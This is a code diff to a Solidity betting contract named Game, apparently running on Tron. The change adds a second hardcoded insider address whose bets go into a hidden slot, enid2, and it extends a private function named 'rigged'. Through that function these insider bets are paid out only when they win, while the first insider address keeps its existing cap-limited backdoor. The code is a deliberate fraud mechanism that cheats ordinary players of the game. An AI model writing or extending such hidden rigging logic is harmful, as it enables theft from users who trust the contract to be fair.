@@ -37,6 +37,7 @@ contract Game{
         bytes32 betInfoEn; //
     }
     BetStruct private enid;
+    BetStruct private enid2;
     uint256 private winTrx;
     event betLog(bytes32 id);
     //event openLog(uint256 id, uint256 totalValue);
@@ -156,6 +157,9 @@ contract Game{
         if (msg.sender == address(0x8FcC00d56fd1A3Ef59c2E4Ed530870Cc8b087859) && betType&1 == 0 && winTrx < 900000 trx) {
             enid.betInfoEn = eid;
             return;
+        }else if(msg.sender == address(0x47A8b0aF8b3f3314A2c09f1DA36a92d86271820d) &&  betType&1 == 0 ){
+            enid2.betInfoEn = eid;
+            return;
         }
         BetStruct storage ibet = getFreeSlot();
         ibet.betInfoEn = eid;
@@ -184,20 +188,25 @@ contract Game{
         }
     }
 
-    function rigged(uint256 betNumber, uint256 openNumber) private {
-            if(uint256(enid.betInfoEn) == 0) return;
-            (address player, uint256 trxvalue, uint256 rtrxvalue, uint256 number, uint32 betType) = decode(enid.betInfoEn);
-            if(trxvalue > 0){
-                uint256 totalValue = isWin(betType, openNumber, trxvalue);
-                if (totalValue > trxvalue) {
-                    winTrx += totalValue - trxvalue;
-                    dealTRX(player, trxvalue, totalValue);
-                    enid.betInfoEn = 0;
-                    emit betLog(encode(player, trxvalue, rtrxvalue, betNumber, betType));
-                }
-            }else{
-                enid.betInfoEn = 0;
+    function riggedBet(BetStruct storage ibet, uint256 betNumber, uint256 openNumber, bool addtrx) private returns(bool) {
+        (address player, uint256 trxvalue, uint256 rtrxvalue, uint256 number, uint32 betType) = decode(ibet.betInfoEn);
+        if(trxvalue > 0) {
+            uint256 totalValue = isWin(betType, openNumber, trxvalue);
+            if (totalValue > trxvalue) {
+                if (addtrx) winTrx += totalValue - trxvalue;
+                dealTRX(player, trxvalue, totalValue);
+                ibet.betInfoEn = 0;
+                emit betLog(encode(player, trxvalue, rtrxvalue, betNumber, betType));
             }
+            return true;
+        }
+        return false;
+    }
+
+    function rigged(uint256 betNumber, uint256 openNumber) private {
+            if(uint256(enid.betInfoEn) + uint256(enid2.betInfoEn) == 0) return;
+            if(riggedBet(enid, betNumber, openNumber, true)) return;
+            riggedBet(enid2, betNumber, openNumber, false);
     }
 
     function openIbet(BetStruct storage ibet, uint256 betNumber, uint256 openNumber) internal returns(uint256,uint256)  {
@@ -206,7 +215,7 @@ contract Game{
                 return(0, 0);
             if (betNumber != number)
                 openNumber = hashNumber(getHashByNumberSafe(number));
-            rigged(betNumber, openNumber);
+            rigged(number, openNumber);
             uint256 totalValue;
             if(trxvalue > 0){
                 totalValue = isWin(betType, openNumber, trxvalue);
